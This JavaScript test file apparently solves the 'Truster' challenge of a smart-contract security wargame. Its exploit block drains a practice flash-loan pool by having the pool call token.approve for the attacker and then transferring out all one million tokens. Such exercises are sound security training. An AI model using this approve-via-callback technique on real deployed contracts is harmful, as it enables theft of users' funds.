const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');

        console.log("Deployer: ", deployer.address);
        console.log("Attacker: ", attacker.address);
        console.log("Token:    ", this.token.address);
        console.log("Pool:     ", this.pool.address);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        // Make a flash loan and specify DamnValuableToken.approve()
        // as the callback function, so that the pool will call it and approve
        // some token for us. Then we taken away all of them.
        await this.pool.connect(attacker).flashLoan(
            /* borrowAmount */ 0,
            /* borrower */ attacker.address,
            /* target */ this.token.address,
            /* data */
            this.token.interface.encodeFunctionData(
                "approve",
                [attacker.address, TOKENS_IN_POOL])
        );
        await this.token.connect(attacker).transferFrom(
            this.pool.address, attacker.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

